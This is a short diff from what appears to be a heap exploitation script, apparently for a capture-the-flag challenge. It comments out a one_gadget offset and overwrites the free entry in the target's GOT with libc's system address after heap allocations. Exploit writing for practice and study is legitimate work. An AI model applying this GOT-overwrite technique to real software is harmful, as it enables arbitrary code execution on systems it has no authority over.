@@ -138,7 +138,7 @@ write(r, a, a_min_heap_prec, 8)
 alloc(r, 0x20)
 min_heap_prec_chunk = alloc(r, 0x20) # key is set to 0 -> min_heap is set to 0
 #Overwrite of free in got
-one_gadget = 0x4f2a5
+#one_gadget = 0x4f2a5
 #write(r, EXE.got["free"], LIBC.address + one_gadget, len(str(LIBC.address + one_gadget)))
 write(r, EXE.got["free"], LIBC.symbols["system"], len(str(LIBC.symbols["system"])))
 a = alloc(r, 0x50)
